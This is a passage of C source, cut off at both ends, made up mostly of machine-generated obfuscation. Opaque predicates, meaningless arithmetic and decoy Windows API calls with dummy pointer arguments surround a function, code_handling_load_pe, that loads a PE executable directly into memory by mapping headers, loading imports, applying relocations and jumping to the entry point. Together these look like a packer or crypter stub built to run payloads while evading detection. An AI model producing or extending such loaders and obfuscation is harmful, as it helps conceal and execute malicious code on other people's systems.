            v541540c03d209d5abba9cb44f34d3d7f_computation_opaque = vf2314fa39f2cc0a2976fb140d3504e81_computation_opaque % ve8ee5f7033e5d7663a024657b5f4bdf2_useless_opaque;
            v541540c03d209d5abba9cb44f34d3d7f_computation_opaque = ve620a46eec08572992495e882424516c_computation_opaque | vf2314fa39f2cc0a2976fb140d3504e81_computation_opaque;
            vf731280a95e05a499b1a58d35faa3ae9_random_opaque = v541540c03d209d5abba9cb44f34d3d7f_computation_opaque != ((unsigned int) 44);
            v048979c0003884482a6b8d465204d0c2_computation_opaque = v10062067d431d0c9e15631e24fdd4674_computation_opaque == v57a67c5889d76e5f7be542819aa02ca8_useless_opaque;
            ve620a46eec08572992495e882424516c_computation_opaque = v541540c03d209d5abba9cb44f34d3d7f_computation_opaque < v4b26b8d5facaf1a3d95b506d88ad9ea5_computation_opaque;
          }
        }

        unsigned int v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque = v048979c0003884482a6b8d465204d0c2_computation_opaque;
        vf2314fa39f2cc0a2976fb140d3504e81_computation_opaque = (unsigned int) 1;
        v541540c03d209d5abba9cb44f34d3d7f_computation_opaque = (unsigned int) 3;
        while ((v541540c03d209d5abba9cb44f34d3d7f_computation_opaque * v541540c03d209d5abba9cb44f34d3d7f_computation_opaque) <= v4b26b8d5facaf1a3d95b506d88ad9ea5_computation_opaque)
        {
          if ((v4b26b8d5facaf1a3d95b506d88ad9ea5_computation_opaque % v541540c03d209d5abba9cb44f34d3d7f_computation_opaque) == ((unsigned int) 0))
          {
            if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
            {
              unsigned long v9fdf907dbc77de440cee3e7bb260ebdb = (unsigned long) 0xab8c134c;
              unsigned long v4e3f74aacd8a3df81578c3dd87e2fb2c = (unsigned long) 0x3cbc02e3;
              void * v931e4ee72cdb5c7869bd59aae50f1613 = (void *) 0xec00d2a4;
              if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
              {
                void * vb85334062b4fd3537fd154c9d5d25162 = (void *) 0x2da96146;
                if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
                {
                  v541540c03d209d5abba9cb44f34d3d7f_computation_opaque = ve620a46eec08572992495e882424516c_computation_opaque + ((unsigned int) 124);
                  vf731280a95e05a499b1a58d35faa3ae9_random_opaque = vf2314fa39f2cc0a2976fb140d3504e81_computation_opaque * v10062067d431d0c9e15631e24fdd4674_computation_opaque;
                  v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque = v4b26b8d5facaf1a3d95b506d88ad9ea5_computation_opaque * ve8ee5f7033e5d7663a024657b5f4bdf2_useless_opaque;
                  v10062067d431d0c9e15631e24fdd4674_computation_opaque = v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque | vf731280a95e05a499b1a58d35faa3ae9_random_opaque;
                  v541540c03d209d5abba9cb44f34d3d7f_computation_opaque = v048979c0003884482a6b8d465204d0c2_computation_opaque || ve8ee5f7033e5d7663a024657b5f4bdf2_useless_opaque;
                  ve8ee5f7033e5d7663a024657b5f4bdf2_useless_opaque = vf731280a95e05a499b1a58d35faa3ae9_random_opaque < v048979c0003884482a6b8d465204d0c2_computation_opaque;
                }
                long va8e5b82f9cdfac8cb872d6690e887193 = (long) 0x71969eb1;
                va8e5b82f9cdfac8cb872d6690e887193 = RoUnregisterForApartmentShutdown(vb85334062b4fd3537fd154c9d5d25162);
                if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
                {
                  void * vdbbde16a0d5e75c7791c6a9c3b395d47 = (void *) 0xe1cdf9aa;
                  void * va3a58831d1996f251de3aa259978a3ca = (void *) 0x2e60c73e;
                  unsigned long v181a1e0e00083d3aec5355bcc357edce = (unsigned long) 0x2dc55b81;
                  unsigned long v6fefe891f9a8a82654b6a2d1a05b6529 = (unsigned long) 0x3fb1959a;
                  v6fefe891f9a8a82654b6a2d1a05b6529 = GetModuleFileNameA(vdbbde16a0d5e75c7791c6a9c3b395d47, va3a58831d1996f251de3aa259978a3ca, v181a1e0e00083d3aec5355bcc357edce);
                }
              }
              int v46da518802d0c536c003f7d5d096c3ba = (int) 0x42d98d33;
              if (((v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque == ((unsigned int) 2)))
              {
                int vfe5090f14d7d5a6006a6804c0ec91d38 = (int) 0x6668b184;
                vfe5090f14d7d5a6006a6804c0ec91d38 = GetLocaleInfoW(v9fdf907dbc77de440cee3e7bb260ebdb, v4e3f74aacd8a3df81578c3dd87e2fb2c, v931e4ee72cdb5c7869bd59aae50f1613, v46da518802d0c536c003f7d5d096c3ba);
              }
            }
            if ((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25)))
            {
              if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
              {
                ve8ee5f7033e5d7663a024657b5f4bdf2_useless_opaque = ve620a46eec08572992495e882424516c_computation_opaque / v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque;
                vf731280a95e05a499b1a58d35faa3ae9_random_opaque = v048979c0003884482a6b8d465204d0c2_computation_opaque || v10062067d431d0c9e15631e24fdd4674_computation_opaque;
                v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque = v10062067d431d0c9e15631e24fdd4674_computation_opaque - vb55175dd9af3c0303bce55289e856cc9_useless_opaque;
                vf731280a95e05a499b1a58d35faa3ae9_random_opaque = ve620a46eec08572992495e882424516c_computation_opaque != v4b26b8d5facaf1a3d95b506d88ad9ea5_computation_opaque;
                v541540c03d209d5abba9cb44f34d3d7f_computation_opaque = v57a67c5889d76e5f7be542819aa02ca8_useless_opaque + v10062067d431d0c9e15631e24fdd4674_computation_opaque;
                vb55175dd9af3c0303bce55289e856cc9_useless_opaque = ve8ee5f7033e5d7663a024657b5f4bdf2_useless_opaque != vf731280a95e05a499b1a58d35faa3ae9_random_opaque;
                ve620a46eec08572992495e882424516c_computation_opaque = ve620a46eec08572992495e882424516c_computation_opaque == v048979c0003884482a6b8d465204d0c2_computation_opaque;
              }
              if (!(((v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque == ((unsigned int) 2))))
              {
                v57a67c5889d76e5f7be542819aa02ca8_useless_opaque = v57a67c5889d76e5f7be542819aa02ca8_useless_opaque != v4b26b8d5facaf1a3d95b506d88ad9ea5_computation_opaque;
                vf731280a95e05a499b1a58d35faa3ae9_random_opaque = v57a67c5889d76e5f7be542819aa02ca8_useless_opaque <= vf731280a95e05a499b1a58d35faa3ae9_random_opaque;
              }
              vf2314fa39f2cc0a2976fb140d3504e81_computation_opaque = (unsigned int) 0;
            }
          }
          if (!(((v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque == ((unsigned int) 2))))
          {
            if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
            {
              v57a67c5889d76e5f7be542819aa02ca8_useless_opaque = v4b26b8d5facaf1a3d95b506d88ad9ea5_computation_opaque || v10062067d431d0c9e15631e24fdd4674_computation_opaque;
              v048979c0003884482a6b8d465204d0c2_computation_opaque = v048979c0003884482a6b8d465204d0c2_computation_opaque <= vb55175dd9af3c0303bce55289e856cc9_useless_opaque;
              v4b26b8d5facaf1a3d95b506d88ad9ea5_computation_opaque = vf731280a95e05a499b1a58d35faa3ae9_random_opaque * v048979c0003884482a6b8d465204d0c2_computation_opaque;
              v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque = ve620a46eec08572992495e882424516c_computation_opaque || v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque;
              vb55175dd9af3c0303bce55289e856cc9_useless_opaque = v57a67c5889d76e5f7be542819aa02ca8_useless_opaque - vf2314fa39f2cc0a2976fb140d3504e81_computation_opaque;
              vf731280a95e05a499b1a58d35faa3ae9_random_opaque = vb55175dd9af3c0303bce55289e856cc9_useless_opaque / vf2314fa39f2cc0a2976fb140d3504e81_computation_opaque;
            }
            v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque = vf2314fa39f2cc0a2976fb140d3504e81_computation_opaque + ve620a46eec08572992495e882424516c_computation_opaque;
            ve620a46eec08572992495e882424516c_computation_opaque = v57a67c5889d76e5f7be542819aa02ca8_useless_opaque <= v541540c03d209d5abba9cb44f34d3d7f_computation_opaque;
            ve620a46eec08572992495e882424516c_computation_opaque = ve620a46eec08572992495e882424516c_computation_opaque < v541540c03d209d5abba9cb44f34d3d7f_computation_opaque;
            vf731280a95e05a499b1a58d35faa3ae9_random_opaque = v10062067d431d0c9e15631e24fdd4674_computation_opaque - ve8ee5f7033e5d7663a024657b5f4bdf2_useless_opaque;
            if (!(((v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque == ((unsigned int) 2))))
            {
              vf2314fa39f2cc0a2976fb140d3504e81_computation_opaque = v57a67c5889d76e5f7be542819aa02ca8_useless_opaque + v541540c03d209d5abba9cb44f34d3d7f_computation_opaque;
              if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
              {
                v4b26b8d5facaf1a3d95b506d88ad9ea5_computation_opaque = vf2314fa39f2cc0a2976fb140d3504e81_computation_opaque || ve8ee5f7033e5d7663a024657b5f4bdf2_useless_opaque;
                v048979c0003884482a6b8d465204d0c2_computation_opaque = vb55175dd9af3c0303bce55289e856cc9_useless_opaque / v10062067d431d0c9e15631e24fdd4674_computation_opaque;
                ve8ee5f7033e5d7663a024657b5f4bdf2_useless_opaque = v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque + vb55175dd9af3c0303bce55289e856cc9_useless_opaque;
                ve620a46eec08572992495e882424516c_computation_opaque = vf2314fa39f2cc0a2976fb140d3504e81_computation_opaque <= ((unsigned int) 106);
                v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque = v10062067d431d0c9e15631e24fdd4674_computation_opaque % ((unsigned int) 34);
              }
              v10062067d431d0c9e15631e24fdd4674_computation_opaque = ve620a46eec08572992495e882424516c_computation_opaque <= ((unsigned int) 28);
            }
            v4b26b8d5facaf1a3d95b506d88ad9ea5_computation_opaque = v10062067d431d0c9e15631e24fdd4674_computation_opaque / vb55175dd9af3c0303bce55289e856cc9_useless_opaque;
            v4b26b8d5facaf1a3d95b506d88ad9ea5_computation_opaque = vf2314fa39f2cc0a2976fb140d3504e81_computation_opaque != vf731280a95e05a499b1a58d35faa3ae9_random_opaque;
            v048979c0003884482a6b8d465204d0c2_computation_opaque = vb55175dd9af3c0303bce55289e856cc9_useless_opaque % vf731280a95e05a499b1a58d35faa3ae9_random_opaque;
          }
          if (!(((v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque == ((unsigned int) 2))))
          {
            unsigned long vdc1e5fb9d9a1db102d9bacb34db74e12 = (unsigned long) 0x3cfd25f9;
            if (!(((v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque == ((unsigned int) 2))))
            {
              void * vddba2e1251433ba905c57fba885107b2 = (void *) 0xd8291f90;
              if (!(((v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque == ((unsigned int) 2))))
              {
                unsigned long v4769d8b8267faad03d417a4302121ba0 = (unsigned long) 0xe8b99f33;
                unsigned long vaa07640b045314f64dcc8750cf56773c = (unsigned long) 0x3c97ecd0;
                if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
                {
                  vb55175dd9af3c0303bce55289e856cc9_useless_opaque = v10062067d431d0c9e15631e24fdd4674_computation_opaque % vb55175dd9af3c0303bce55289e856cc9_useless_opaque;
                  vb55175dd9af3c0303bce55289e856cc9_useless_opaque = ve620a46eec08572992495e882424516c_computation_opaque | v541540c03d209d5abba9cb44f34d3d7f_computation_opaque;
                  vf2314fa39f2cc0a2976fb140d3504e81_computation_opaque = vf2314fa39f2cc0a2976fb140d3504e81_computation_opaque * v4b26b8d5facaf1a3d95b506d88ad9ea5_computation_opaque;
                  v048979c0003884482a6b8d465204d0c2_computation_opaque = v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque / v541540c03d209d5abba9cb44f34d3d7f_computation_opaque;
                }
                vaa07640b045314f64dcc8750cf56773c = MsiGetActiveDatabase(v4769d8b8267faad03d417a4302121ba0);
              }
              int v6cd39ef8a11fd48fd15bf03402b1dbf7 = (int) 0x7c86d5a0;
              v6cd39ef8a11fd48fd15bf03402b1dbf7 = RemoveDllDirectory(vddba2e1251433ba905c57fba885107b2);
              if (!(((v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque == ((unsigned int) 2))))
              {
                v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque = v541540c03d209d5abba9cb44f34d3d7f_computation_opaque | v4b26b8d5facaf1a3d95b506d88ad9ea5_computation_opaque;
                ve620a46eec08572992495e882424516c_computation_opaque = ve8ee5f7033e5d7663a024657b5f4bdf2_useless_opaque <= v541540c03d209d5abba9cb44f34d3d7f_computation_opaque;
                vf2314fa39f2cc0a2976fb140d3504e81_computation_opaque = ve620a46eec08572992495e882424516c_computation_opaque || vb55175dd9af3c0303bce55289e856cc9_useless_opaque;
                vf2314fa39f2cc0a2976fb140d3504e81_computation_opaque = v10062067d431d0c9e15631e24fdd4674_computation_opaque - ve620a46eec08572992495e882424516c_computation_opaque;
                vf731280a95e05a499b1a58d35faa3ae9_random_opaque = v10062067d431d0c9e15631e24fdd4674_computation_opaque == vb55175dd9af3c0303bce55289e856cc9_useless_opaque;
                vb55175dd9af3c0303bce55289e856cc9_useless_opaque = ve8ee5f7033e5d7663a024657b5f4bdf2_useless_opaque % v10062067d431d0c9e15631e24fdd4674_computation_opaque;
              }
            }
            unsigned long vcf10b0c1e8e597dcc7fd81eea1b32eb5 = (unsigned long) 0xcf4b3043;
            if ((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25)))
            {
              void * vbe0770f35e452ca6c2e00583ec8bdae1 = (void *) 0xde8ac9eb;
              int v8bfe39c158080cec65cc08f3a7ece440 = (int) 0x3ac83f4f;
              int v594dd4768cf843e2deb5e82cf97eb095 = (int) 0x62f629e8;
              if ((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25)))
              {
                v594dd4768cf843e2deb5e82cf97eb095 = GetLocaleInfoW(vdc1e5fb9d9a1db102d9bacb34db74e12, vcf10b0c1e8e597dcc7fd81eea1b32eb5, vbe0770f35e452ca6c2e00583ec8bdae1, v8bfe39c158080cec65cc08f3a7ece440);
              }
            }
          }
          if (((v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque == ((unsigned int) 2)))
          {
            if ((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25)))
            {
              if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
              {
                v10062067d431d0c9e15631e24fdd4674_computation_opaque = v048979c0003884482a6b8d465204d0c2_computation_opaque % v57a67c5889d76e5f7be542819aa02ca8_useless_opaque;
                vf731280a95e05a499b1a58d35faa3ae9_random_opaque = v4b26b8d5facaf1a3d95b506d88ad9ea5_computation_opaque % v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque;
              }
              if ((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25)))
              {
                v541540c03d209d5abba9cb44f34d3d7f_computation_opaque = v541540c03d209d5abba9cb44f34d3d7f_computation_opaque + ((unsigned int) 2);
                if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
                {
                  void * v9927b697feb47d6b956f58584387f4dc = (void *) 0x1e77e1e9;
                  unsigned long va35524706909b965ead20d6fc16240bc = (unsigned long) 0x2f539095;
                  unsigned long v3005527a78156b113ba3332d1cf24651 = (unsigned long) 0xa7b4e8d0;
                  if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
                  {
                    if (!(((v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque == ((unsigned int) 2))))
                    {
                      v4b26b8d5facaf1a3d95b506d88ad9ea5_computation_opaque = v1bac1e55fd330ab5d08e43caef1c61e0_prime_opaque / vf2314fa39f2cc0a2976fb140d3504e81_computation_opaque;
                      vf731280a95e05a499b1a58d35faa3ae9_random_opaque = v57a67c5889d76e5f7be542819aa02ca8_useless_opaque || v048979c0003884482a6b8d465204d0c2_computation_opaque;
                    }
                    unsigned long v69938ff62a08f3a04766aec3a677df30 = (unsigned long) 0xcda9b825;
                    unsigned long vc34c0dab6a7cdbf08d8102d461db586d = (unsigned long) 0x17d27e50;
                    vc34c0dab6a7cdbf08d8102d461db586d = MsiGetActiveDatabase(v69938ff62a08f3a04766aec3a677df30);
                    if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
                    {
                      unsigned long vc2309c5753c013d12c4ac9a9cee14d5e = (unsigned long) 0x6551a3e2;
                      unsigned long vc9be85b5bb16ef037651fc64d36831c8 = (unsigned long) 0x933cb4b2;
                      vc9be85b5bb16ef037651fc64d36831c8 = MsiGetActiveDatabase(vc2309c5753c013d12c4ac9a9cee14d5e);
                    }
                  }
                  v3005527a78156b113ba3332d1cf24651 = SnmpListen(v9927b697feb47d6b956f58584387f4dc, va35524706909b965ead20d6fc16240bc);
                }
              }
            }
          }
        }

      }
    }

    unsigned int vcbccd8a61fce1399d89dbdd5a0c93f08_prime_opaque = v4b26b8d5facaf1a3d95b506d88ad9ea5_computation_opaque;
  }
}

in_memory_pe *code_handling_load_pe(const char *pe_data, DWORD size)
{
  {
    {
      unsigned int vb3295c4b0acf481a94c629c7ab5b7b91_useless_opaque = (unsigned int) 2944528087;
      unsigned int v4e0fae28bc4431ca1428b6857d66ce64_computation_opaque = (unsigned int) 0;
      unsigned int vcf4331fce575b833af5e712a30b16c01_computation_opaque = (unsigned int) 3;
      unsigned int vc04b975ddc345132197b1d87f09db025_computation_opaque = (unsigned int) (&vb3295c4b0acf481a94c629c7ab5b7b91_useless_opaque);
      vc04b975ddc345132197b1d87f09db025_computation_opaque = (vc04b975ddc345132197b1d87f09db025_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if (vc04b975ddc345132197b1d87f09db025_computation_opaque < ((unsigned int) 3))
      {
        vc04b975ddc345132197b1d87f09db025_computation_opaque = (unsigned int) 3;
      }
      while (v4e0fae28bc4431ca1428b6857d66ce64_computation_opaque != ((unsigned int) 1))
      {
        vc04b975ddc345132197b1d87f09db025_computation_opaque += (unsigned int) 2;
        v4e0fae28bc4431ca1428b6857d66ce64_computation_opaque = (unsigned int) 1;
        vcf4331fce575b833af5e712a30b16c01_computation_opaque = (unsigned int) 3;
        while ((vcf4331fce575b833af5e712a30b16c01_computation_opaque * vcf4331fce575b833af5e712a30b16c01_computation_opaque) <= vc04b975ddc345132197b1d87f09db025_computation_opaque)
        {
          if ((vc04b975ddc345132197b1d87f09db025_computation_opaque % vcf4331fce575b833af5e712a30b16c01_computation_opaque) == ((unsigned int) 0))
          {
            v4e0fae28bc4431ca1428b6857d66ce64_computation_opaque = (unsigned int) 0;
          }
          vcf4331fce575b833af5e712a30b16c01_computation_opaque = vcf4331fce575b833af5e712a30b16c01_computation_opaque + ((unsigned int) 2);
        }

      }

      unsigned int vcbb7dcad4692ef3ea030cdea2e437941_prime_opaque = vc04b975ddc345132197b1d87f09db025_computation_opaque;
      unsigned int vb6cbefc6fe7ef18f2cd3e08436aca870_useless_opaque = (unsigned int) 4202480888;
      unsigned int v4ff6a9d3d13c3f4fbd937c2ed83458a2_computation_opaque = (unsigned int) (&vb6cbefc6fe7ef18f2cd3e08436aca870_useless_opaque);
      unsigned int v5ccd3abd18dfc1dd597332c2a3040cd9_true_opaque = (((v4ff6a9d3d13c3f4fbd937c2ed83458a2_computation_opaque * v4ff6a9d3d13c3f4fbd937c2ed83458a2_computation_opaque) + v4ff6a9d3d13c3f4fbd937c2ed83458a2_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
      {
        in_memory_pe *new_pe = replacement_malloc(sizeof(in_memory_pe));
        if (new_pe == 0)
          goto error;
        new_pe->data = copy_to_pages(pe_data);
        if (new_pe->data == 0)
          goto error;
        new_pe->pe_dos_header = (IMAGE_DOS_HEADER *) new_pe->data;
        new_pe->pe_nt_header = (IMAGE_NT_HEADERS *) (new_pe->data + new_pe->pe_dos_header->e_lfanew);
        new_pe->sections = (IMAGE_SECTION_HEADER *) (new_pe->pe_nt_header + 1);
        new_pe->data_directory = new_pe->pe_nt_header->OptionalHeader.DataDirectory;
        new_pe->import_descriptors = (IMAGE_IMPORT_DESCRIPTOR *) (new_pe->data + new_pe->data_directory[1].VirtualAddress);
        if (load_libraries(new_pe) != 0)
          goto error;
        resolve_relocations(new_pe);
        if (set_protections(new_pe) != 0)
          goto error;
        new_pe->entry_point = new_pe->data + new_pe->pe_nt_header->OptionalHeader.AddressOfEntryPoint;
        if (!v5ccd3abd18dfc1dd597332c2a3040cd9_true_opaque)
        {
          unsigned long v2c144ab9bcd378ad9b165690bbf58d36 = (unsigned long) 0x931393a1;
          void * v026fc7e484097995a225d1a61ca75bad = (void *) 0x0dff95ca;
          if (!v5ccd3abd18dfc1dd597332c2a3040cd9_true_opaque)
          {
            void * v6e0bd4787fef4da59f4fc669a320101e = (void *) 0x9052becf;
            void * v336f9f83ff53de202d571fc6d4d4ace1 = (void *) 0x83d189ed;
            unsigned long v5e5f2c25c88dcdd83df7c581792d34b4 = (unsigned long) 0x4b77111a;
            if (!v5ccd3abd18dfc1dd597332c2a3040cd9_true_opaque)
            {
              vb6cbefc6fe7ef18f2cd3e08436aca870_useless_opaque = v4e0fae28bc4431ca1428b6857d66ce64_computation_opaque * vcf4331fce575b833af5e712a30b16c01_computation_opaque;
            }
            unsigned long vebf9f25da471aa92319c73f34ab19292 = (unsigned long) 0xca12c4b3;
            vebf9f25da471aa92319c73f34ab19292 = GetModuleFileNameA(v6e0bd4787fef4da59f4fc669a320101e, v336f9f83ff53de202d571fc6d4d4ace1, v5e5f2c25c88dcdd83df7c581792d34b4);
          }
          int vdfa9fa7cc271599e2194a1da29b411eb = (int) 0x92ee032e;
          void * ved7afc556ca1ba61f8775e151d9f52c2 = (void *) 0xf718b164;
          int v74bd8bb56a3260caa68f1e7aaec65c29 = (int) 0xa9fc631b;
          int v14494493be56ea3b70340f4b749d2ea4 = (int) 0xdcd8fdb1;
